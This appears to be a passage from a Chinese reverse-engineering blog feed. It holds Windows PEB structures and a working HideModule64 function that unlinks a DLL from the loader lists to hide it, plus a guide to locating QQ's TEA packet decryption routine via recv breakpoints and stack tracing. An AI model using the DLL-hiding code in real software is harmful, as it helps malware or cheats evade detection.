class="comment">//0x124</span></span><br><span class="line">ULONG ImageSubsystem;                                                   <span class="comment">//0x128</span></span><br><span class="line">ULONG ImageSubsystemMajorVersion;                                       <span class="comment">//0x12c</span></span><br><span class="line">ULONG ImageSubsystemMinorVersion;                                       <span class="comment">//0x130</span></span><br><span class="line">UCHAR Padding4[<span class="number">4</span>];                                                      <span class="comment">//0x134</span></span><br><span class="line">ULONGLONG ActiveProcessAffinityMask;                                    <span class="comment">//0x138</span></span><br><span class="line">ULONG GdiHandleBuffer[<span class="number">60</span>];                                              <span class="comment">//0x140</span></span><br><span class="line"><span class="built_in">VOID</span>(*PostProcessInitRoutine)();                                       <span class="comment">//0x230</span></span><br><span class="line">VOID* TlsExpansionBitmap;                                               <span class="comment">//0x238</span></span><br><span class="line">ULONG TlsExpansionBitmapBits[<span class="number">32</span>];                                       <span class="comment">//0x240</span></span><br><span class="line">ULONG SessionId;                                                        <span class="comment">//0x2c0</span></span><br><span class="line">UCHAR Padding5[<span class="number">4</span>];                                                      <span class="comment">//0x2c4</span></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">_ULARGE_INTEGER</span> AppCompatFlags;                                   <span class="comment">//0x2c8</span></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">_ULARGE_INTEGER</span> AppCompatFlagsUser;                               <span class="comment">//0x2d0</span></span><br><span class="line">VOID* pShimData;                                                        <span class="comment">//0x2d8</span></span><br><span class="line">VOID* AppCompatInfo;                                                    <span class="comment">//0x2e0</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> CSDVersion;                                      <span class="comment">//0x2e8</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT_DATA</span>* ActivationContextData;                 <span class="comment">//0x2f8</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_ASSEMBLY_STORAGE_MAP</span>* ProcessAssemblyStorageMap;                <span class="comment">//0x300</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT_DATA</span>* SystemDefaultActivationContextData;    <span class="comment">//0x308</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_ASSEMBLY_STORAGE_MAP</span>* SystemAssemblyStorageMap;                 <span class="comment">//0x310</span></span><br><span class="line">ULONGLONG MinimumStackCommit;                                           <span class="comment">//0x318</span></span><br><span class="line">VOID* SparePointers[<span class="number">4</span>];                                                 <span class="comment">//0x320</span></span><br><span class="line">ULONG SpareUlongs[<span class="number">5</span>];                                                   <span class="comment">//0x340</span></span><br><span class="line">VOID* WerRegistrationData;                                              <span class="comment">//0x358</span></span><br><span class="line">VOID* WerShipAssertPtr;                                                 <span class="comment">//0x360</span></span><br><span class="line">VOID* pUnused;                                                          <span class="comment">//0x368</span></span><br><span class="line">VOID* pImageHeaderHash;                                                 <span class="comment">//0x370</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">ULONG TracingFlags;                                                 <span class="comment">//0x378</span></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">ULONG HeapTracingEnabled : <span class="number">1</span>;                                     <span class="comment">//0x378</span></span><br><span class="line">ULONG CritSecTracingEnabled : <span class="number">1</span>;                                  <span class="comment">//0x378</span></span><br><span class="line">ULONG LibLoaderTracingEnabled : <span class="number">1</span>;                                <span class="comment">//0x378</span></span><br><span class="line">ULONG SpareTracingBits : <span class="number">29</span>;                                      <span class="comment">//0x378</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">UCHAR Padding6[<span class="number">4</span>];                                                      <span class="comment">//0x37c</span></span><br><span class="line">ULONGLONG CsrServerReadOnlySharedMemoryBase;                            <span class="comment">//0x380</span></span><br><span class="line">ULONGLONG TppWorkerpListLock;                                           <span class="comment">//0x388</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> TppWorkerpList;                                      <span class="comment">//0x390</span></span><br><span class="line">VOID* WaitOnAddressHashTable[<span class="number">128</span>];                                      <span class="comment">//0x3a0</span></span><br><span class="line">VOID* TelemetryCoverageHeader;                                          <span class="comment">//0x7a0</span></span><br><span class="line">ULONG CloudFileFlags;                                                   <span class="comment">//0x7a8</span></span><br><span class="line">ULONG CloudFileDiagFlags;                                               <span class="comment">//0x7ac</span></span><br><span class="line">CHAR PlaceholderCompatibilityMode;                                      <span class="comment">//0x7b0</span></span><br><span class="line">CHAR PlaceholderCompatibilityModeReserved[<span class="number">7</span>];                           <span class="comment">//0x7b1</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LEAP_SECOND_DATA</span>* LeapSecondData;                               <span class="comment">//0x7b8</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">ULONG LeapSecondFlags;                                              <span class="comment">//0x7c0</span></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">ULONG SixtySecondEnabled : <span class="number">1</span>;                                     <span class="comment">//0x7c0</span></span><br><span class="line">ULONG Reserved : <span class="number">31</span>;                                              <span class="comment">//0x7c0</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">ULONG NtGlobalFlag2;                                                    <span class="comment">//0x7c4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0xc bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_BALANCED_NODE</span> &#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_BALANCED_NODE</span>* Children[<span class="number">2</span>];                             <span class="comment">//0x0</span></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_BALANCED_NODE</span>* Left;                                <span class="comment">//0x0</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_BALANCED_NODE</span>* Right;                               <span class="comment">//0x4</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">UCHAR Red : <span class="number">1</span>;                                                    <span class="comment">//0x8</span></span><br><span class="line">UCHAR Balance : <span class="number">2</span>;                                                <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br><span class="line">ULONG ParentValue;                                                  <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0xa8 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InLoadOrderLinks;                                    <span class="comment">//0x0</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InMemoryOrderLinks;                                  <span class="comment">//0x8</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> InInitializationOrderLinks;                          <span class="comment">//0x10</span></span><br><span class="line">VOID* DllBase;                                                          <span class="comment">//0x18</span></span><br><span class="line">VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> FullDllName;                                     <span class="comment">//0x24</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> BaseDllName;                                     <span class="comment">//0x2c</span></span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">UCHAR FlagGroup[<span class="number">4</span>];                                                 <span class="comment">//0x34</span></span><br><span class="line">ULONG Flags;                                                        <span class="comment">//0x34</span></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">ULONG PackagedBinary : <span class="number">1</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG MarkedForRemoval : <span class="number">1</span>;                                       <span class="comment">//0x34</span></span><br><span class="line">ULONG ImageDll : <span class="number">1</span>;                                               <span class="comment">//0x34</span></span><br><span class="line">ULONG LoadNotificationsSent : <span class="number">1</span>;                                  <span class="comment">//0x34</span></span><br><span class="line">ULONG TelemetryEntryProcessed : <span class="number">1</span>;                                <span class="comment">//0x34</span></span><br><span class="line">ULONG ProcessStaticImport : <span class="number">1</span>;                                    <span class="comment">//0x34</span></span><br><span class="line">ULONG InLegacyLists : <span class="number">1</span>;                                          <span class="comment">//0x34</span></span><br><span class="line">ULONG InIndexes : <span class="number">1</span>;                                              <span class="comment">//0x34</span></span><br><span class="line">ULONG ShimDll : <span class="number">1</span>;                                                <span class="comment">//0x34</span></span><br><span class="line">ULONG InExceptionTable : <span class="number">1</span>;                                       <span class="comment">//0x34</span></span><br><span class="line">ULONG ReservedFlags1 : <span class="number">2</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG LoadInProgress : <span class="number">1</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG LoadConfigProcessed : <span class="number">1</span>;                                    <span class="comment">//0x34</span></span><br><span class="line">ULONG EntryProcessed : <span class="number">1</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG ProtectDelayLoad : <span class="number">1</span>;                                       <span class="comment">//0x34</span></span><br><span class="line">ULONG ReservedFlags3 : <span class="number">2</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG DontCallForThreads : <span class="number">1</span>;                                     <span class="comment">//0x34</span></span><br><span class="line">ULONG ProcessAttachCalled : <span class="number">1</span>;                                    <span class="comment">//0x34</span></span><br><span class="line">ULONG ProcessAttachFailed : <span class="number">1</span>;                                    <span class="comment">//0x34</span></span><br><span class="line">ULONG CorDeferredValidate : <span class="number">1</span>;                                    <span class="comment">//0x34</span></span><br><span class="line">ULONG CorImage : <span class="number">1</span>;                                               <span class="comment">//0x34</span></span><br><span class="line">ULONG DontRelocate : <span class="number">1</span>;                                           <span class="comment">//0x34</span></span><br><span class="line">ULONG CorILOnly : <span class="number">1</span>;                                              <span class="comment">//0x34</span></span><br><span class="line">ULONG ChpeImage : <span class="number">1</span>;                                              <span class="comment">//0x34</span></span><br><span class="line">ULONG ReservedFlags5 : <span class="number">2</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG Redirected : <span class="number">1</span>;                                             <span class="comment">//0x34</span></span><br><span class="line">ULONG ReservedFlags6 : <span class="number">2</span>;                                         <span class="comment">//0x34</span></span><br><span class="line">ULONG CompatDatabaseProcessed : <span class="number">1</span>;                                <span class="comment">//0x34</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">USHORT ObsoleteLoadCount;                                               <span class="comment">//0x38</span></span><br><span class="line">USHORT TlsIndex;                                                        <span class="comment">//0x3a</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> HashLinks;                                           <span class="comment">//0x3c</span></span><br><span class="line">ULONG TimeDateStamp;                                                    <span class="comment">//0x44</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT</span>* EntryPointActivationContext;                <span class="comment">//0x48</span></span><br><span class="line">VOID* Lock;                                                             <span class="comment">//0x4c</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LDR_DDAG_NODE</span>* DdagNode;                                        <span class="comment">//0x50</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> NodeModuleLink;                                      <span class="comment">//0x54</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_LDRP_LOAD_CONTEXT</span>* LoadContext;                                 <span class="comment">//0x5c</span></span><br><span class="line">VOID* ParentDllBase;                                                    <span class="comment">//0x60</span></span><br><span class="line">VOID* SwitchBackContext;                                                <span class="comment">//0x64</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_BALANCED_NODE</span> BaseAddressIndexNode;                         <span class="comment">//0x68</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_RTL_BALANCED_NODE</span> MappingInfoIndexNode;                         <span class="comment">//0x74</span></span><br><span class="line">ULONG OriginalBase;                                                     <span class="comment">//0x80</span></span><br><span class="line"><span class="keyword">union</span> <span class="title class_">_LARGE_INTEGER</span> LoadTime;                                          <span class="comment">//0x88</span></span><br><span class="line">ULONG BaseNameHashValue;                                                <span class="comment">//0x90</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">_LDR_DLL_LOAD_REASON</span> LoadReason;                                   <span class="comment">//0x94</span></span><br><span class="line">ULONG ImplicitPathOptions;                                              <span class="comment">//0x98</span></span><br><span class="line">ULONG ReferenceCount;                                                   <span class="comment">//0x9c</span></span><br><span class="line">ULONG DependentLoadFlags;                                               <span class="comment">//0xa0</span></span><br><span class="line">UCHAR SigningLevel;                                                     <span class="comment">//0xa4</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION64</span> &#123;</span><br><span class="line">NTSTATUS ExitStatus;</span><br><span class="line">UINT32 Reserved0;</span><br><span class="line">UINT64 PebBaseAddress;</span><br><span class="line">UINT64 AffinityMask;</span><br><span class="line">UINT32 BasePriority;</span><br><span class="line">UINT32 Reserved1;</span><br><span class="line">UINT64 UniqueProcessId;</span><br><span class="line">UINT64 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION64;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐藏64位DLL</span></span><br><span class="line"><span class="function">BOOL <span class="title">HideModule64</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szModule)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="HideDll-cpp"><a href="#HideDll-cpp" class="headerlink" title="HideDll.cpp"></a>HideDll.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;HideDll.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">HideModule64</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szModule)</span> </span>&#123;</span><br><span class="line">BOOL isSuccess = FALSE;</span><br><span class="line">DWORD* PEB = <span class="literal">NULL</span>;</span><br><span class="line">DWORD* Ldr = <span class="literal">NULL</span>;</span><br><span class="line">DWORD* Flink = <span class="literal">NULL</span>;</span><br><span class="line">DWORD* p = <span class="literal">NULL</span>;</span><br><span class="line">DWORD* BaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">DWORD* FullDllName = <span class="literal">NULL</span>;<span class="comment">//定位PEB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取NT句柄</span></span><br><span class="line">HMODULE hNtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hNtdllModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取需要隐藏的DLL模块地址</span></span><br><span class="line">HMODULE hCurrentModule = <span class="built_in">GetModuleHandle</span>(szModule);</span><br><span class="line"><span class="keyword">if</span> (hCurrentModule == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取必备函数（64位）</span></span><br><span class="line">PFN_NtQueryInformationProcess NtQueryInformationProcess = (PFN_NtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(hNtdllModule, <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtQueryInformationProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br><span class="line">PFN_NtReadVirtualMemory NtReadVirtualMemory = (PFN_NtReadVirtualMemory)<span class="built_in">GetProcAddress</span>(hNtdllModule, <span class="string">&quot;NtReadVirtualMemory&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtReadVirtualMemory == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取PEB</span></span><br><span class="line">PROCESS_BASIC_INFORMATION64 pbi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ULONG unReturnLength = <span class="number">0</span>;</span><br><span class="line">NTSTATUS Status = <span class="built_in">NtQueryInformationProcess</span>(<span class="built_in">GetCurrentProcess</span>(), ProcessBasicInformation, &amp;pbi, (UINT32)<span class="built_in">sizeof</span>(pbi), &amp;unReturnLength);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">_PEB* peb = (_PEB*)pbi.PebBaseAddress;</span><br><span class="line"><span class="keyword">if</span> (peb == <span class="literal">nullptr</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLIST_ENTRY head = &amp;peb-&gt;Ldr-&gt;InLoadOrderModuleList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指向的结点.</span></span><br><span class="line">PLIST_ENTRY current = head-&gt;Flink;                                  </span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 获取 _LDR_DATA_TABLE_ENTRY结构体地址</span></span><br><span class="line">_LDR_DATA_TABLE_ENTRY* tableEntry = <span class="built_in">CONTAINING_RECORD</span>(current, _LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line"><span class="comment">// 判断要隐藏的DLL基址跟结构中的基址是否一样</span></span><br><span class="line"><span class="keyword">if</span> (hCurrentModule == tableEntry-&gt;DllBase) &#123;</span><br><span class="line">isSuccess = TRUE;</span><br><span class="line"><span class="comment">// 双向链表. 断开链表</span></span><br><span class="line">tableEntry-&gt;InLoadOrderLinks.Blink-&gt;Flink =</span><br><span class="line">tableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">tableEntry-&gt;InLoadOrderLinks.Flink-&gt;Blink =</span><br><span class="line">tableEntry-&gt;InLoadOrderLinks.Blink;</span><br><span class="line"></span><br><span class="line">tableEntry-&gt;InInitializationOrderLinks.Blink-&gt;Flink =</span><br><span class="line">tableEntry-&gt;InInitializationOrderLinks.Flink;</span><br><span class="line">tableEntry-&gt;InInitializationOrderLinks.Flink-&gt;Blink =</span><br><span class="line">tableEntry-&gt;InInitializationOrderLinks.Blink;</span><br><span class="line"></span><br><span class="line">tableEntry-&gt;InMemoryOrderLinks.Blink-&gt;Flink =</span><br><span class="line">tableEntry-&gt;InMemoryOrderLinks.Flink;</span><br><span class="line">tableEntry-&gt;InMemoryOrderLinks.Flink-&gt;Blink =</span><br><span class="line">tableEntry-&gt;InMemoryOrderLinks.Blink;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">current = current-&gt;Flink;</span><br><span class="line">&#125; <span class="keyword">while</span> (head != current);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> isSuccess;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="微软未公开结构体查询网站"><a href="#微软未公开结构体查询网站" class="headerlink" title="微软未公开结构体查询网站"></a>微软未公开结构体查询网站</h2><p><a href="https://www.vergiliusproject.com/">Vergilius Project Home</a></p><p><a href="http://undocumented.ntinternals.net/">NTAPI Undocumented Functions (ntinternals.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QQtea加密函数寻找思路</title>
      <link href="/2614a6b3e4bb/"/>
      <url>/2614a6b3e4bb/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在入门逆向这个行业之前，曾经以最低效的方法研究了QQ协议。在研究QQ协议的人们都知道有一个加密的函数，阻挡了抓包分析的道路。因为这个加密函数致使我们必须hook才能解开封包。而那个时候的我只能祈祷大佬们给我用用他们的工具。而通过深入学习逆向后，决定对这个函数正式开刀。</p><h1 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h1><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=689850585&bvid=BV1624y1f7KE&cid=881234736&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;"> </iframe></div><h1 id="第一步：思考如何使用加密解密函数"><a href="#第一步：思考如何使用加密解密函数" class="headerlink" title="第一步：思考如何使用加密解密函数"></a>第一步：思考如何使用加密解密函数</h1><p>首先我们需要站在开发的角度去思考，如果是我，我会如何使用加密&#x2F;解密函数对数据包进行处理呢。那么我大概归为以下几个步骤。</p><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><ol><li>获取数据</li><li>组装明文数据</li><li>调用加密call进行数据加密</li><li>调用send&#x2F;sendto发送密文封包</li></ol><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ol><li>调用recv&#x2F;recvfrom函数接收封包</li><li>调用解密call对密文解密</li><li>处理解密后数据</li></ol><h1 id="第二步：分析思路"><a href="#第二步：分析思路" class="headerlink" title="第二步：分析思路"></a>第二步：分析思路</h1><p>分析方法很简单且普通，就是一个方法。利用栈回溯即可。一步一步分析他是从哪个函数得到了密文&#x2F;明文。</p><p>这里我更推荐从解密call寻找，通过前辈们的经验告诉我们加密call和解密call是相邻的两个函数，那么我们找到其中一个另一个自然就能得到。</p><p>这里笔者建议从解密call入手比较方便，因为通过抓包器或者recv&#x2F;recvfrom函数我们已经知道密文是什么了，只需要看到哪里对这个密文进行了操作即可。</p><p><strong>大致过程如下：</strong></p><ol><li>断下recv&#x2F;recvfrom函数</li><li>通过栈回溯让代码继续执行下去，查看什么地方对密文进行了传参操作</li><li>找到传参位置，查看参数的结构。因为解密密文一定需要key，密文包体等内容。这些是必不可缺的一部分。</li><li>找到符合要求的函数单步步过让他执行完，看寄存器和栈结构。查看有没有明文数据出现，如果有则代表找到解密函数附近了。</li><li>通过上述方法一步步筛查到解密函数的最终位置即可。</li></ol><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>本文只着重于对逆向QQ加密解密函数的思路分析，如果有所疑惑可以留言我会进行答复~。下图贴一张加密函数的样子方便你们确定是否真的找到了。<br>注：切勿用于非法用途！</p><p><img src="/../uploads/2022/04/2500379513.png" alt="l1w5ccal.png" title="l1w5ccal.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ解密 </tag>
            
            <tag> TEA加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凌哥脚本软件</title>
      <link href="/4fd146b9f459/"/>
      <url>/4fd146b9f459/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直使用罗技的游戏软件来使用鼠标宏功能，但是貌似这玩意蓝我屏。霉办法，自己整一个咯。</p><h1 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h1><p><img src="/../uploads/2022/03/2118085238.png" alt="l196r7ns.png" title="l196r7ns.png"></p><h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="https://www.lanzoui.com/i750I0gha06f">https://www.lanzoui.com/i750I0gha06f</a></p><h1 id="问题反馈"><a href="#问题反馈" class="headerlink" title="问题反馈"></a>问题反馈</h1><p>如果你使用本软件过程中遇见了什么BUG，请通过博客留言反馈给我。</p>]]></content>
      
      
      <categories>
          
          <category> 应用下载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 凌哥脚本软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MFC中对话框启动时隐藏自身</title>
      <link href="/878ef4991b39/"/>
      <url>/878ef4991b39/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们日常编程中，会遇见需要开启软件时不显示界面的情况，而MFC的对话框在<code>OnInitDialog</code>函数中使用，<code>this-&gt;ShowWindow(SW_HIDE);</code>函数是不起作用的。设置Dialog的属性可见为<code>False</code>也是无效的，所以这里详细说明以下，MFC中如何解决启动时完美隐藏窗口。</p><h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><p>介绍：这里的问题主要为MFC中Dialog窗口的属性可见在模态对话框中是无效的，所以我们需要将对话框改为非模态，并设置可见属性为<code>False</code>就可以完美的解决我们的问题了。下面为具体操作。</p><p>1、在MFC程序的<code>BOOL CDemoApp::InitInstance()</code>函数将模态对话框改为非模态对话框。下列为示例代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CDemoApp::InitInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 如果一个运行在 Windows XP 上的应用程序清单指定要</span></span><br><span class="line">    <span class="comment">// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，</span></span><br><span class="line">    <span class="comment">//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。</span></span><br><span class="line">    INITCOMMONCONTROLSEX InitCtrls;</span><br><span class="line">    InitCtrls.dwSize = <span class="built_in">sizeof</span>(InitCtrls);</span><br><span class="line">    <span class="comment">// 将它设置为包括所有要在应用程序中使用的</span></span><br><span class="line">    <span class="comment">// 公共控件类。</span></span><br><span class="line">    InitCtrls.dwICC = ICC_WIN95_CLASSES;</span><br><span class="line">    <span class="built_in">InitCommonControlsEx</span>(&amp;InitCtrls);</span><br><span class="line"></span><br><span class="line">    CWinApp::<span class="built_in">InitInstance</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">AfxEnableControlContainer</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 shell 管理器，以防对话框包含</span></span><br><span class="line">    <span class="comment">// 任何 shell 树视图控件或 shell 列表视图控件。</span></span><br><span class="line">    CShellManager *pShellManager = <span class="keyword">new</span> CShellManager;</span><br><span 